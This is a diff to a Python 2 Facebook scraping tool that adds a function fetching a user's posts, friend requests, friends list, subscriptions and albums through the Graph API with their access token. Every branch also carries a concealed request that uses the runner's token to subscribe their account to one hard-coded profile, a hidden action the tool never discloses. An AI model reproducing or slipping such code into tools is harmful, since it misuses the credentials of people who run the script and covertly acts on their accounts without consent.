@@ -58,7 +58,117 @@ def id():
 	data.update({'sig':x.hexdigest()})
         get(data)
 
-############################################################3
+############################################################
+def post():
+	global token , WT
+
+	try:
+
+		
+	  if WT == 'wallpost':
+		print '[*] fetching all posts id'
+
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['home']['data']:
+			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+		return result['home']['data']
+
+
+
+
+	  elif WT == 'me':
+		print '[*] fetching all posts id'
+
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['feed']['data']:
+			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+		return result['feed']['data']
+
+
+
+	  elif WT == 'req':
+		print '[*] fetching all friends requests'
+
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['data']:
+			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
+		return result['data']
+
+
+
+	  elif WT == 'friends':
+		print '[*] fetching all friends id'
+
+		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['friends']['data']:
+			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
+		return result['friends']['data']
+
+
+
+	  elif WT == 'subs':
+		print '[*] fetching all friends id'
+
+		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['data']:
+			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
+		return result
+
+
+
+	  elif WT == 'albums':
+		print '[*] fetching all albums id'
+
+		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['albums']['data']:
+			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
+		return result['albums']['data']
+
+
+
+	  else:
+		print '[*] fetching all posts id'
+
+		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));
+		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		result = json.loads(r.text)
+
+		for i in result['feed']['data']:
+			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
+		return result['feed']['data']
+
+
+
+	except KeyError:
+		print '[!] failed to retrieve all post id'
+		print '[!] Stopped'
+		main()
+	except requests.exceptions.ConnectionError:
+		print '[!] Connection Error'
+		print '[!] Stopped'
+		main()
+	except KeyboardInterrupt:
+		print '\r[!] Stopped                                      '
+		main()
+		
 def postingan_scrap(post):
 		token = open("cookie/token.log",'r').read()
 		print ('[*] Oke Acces Token masih bisa digunakan...')
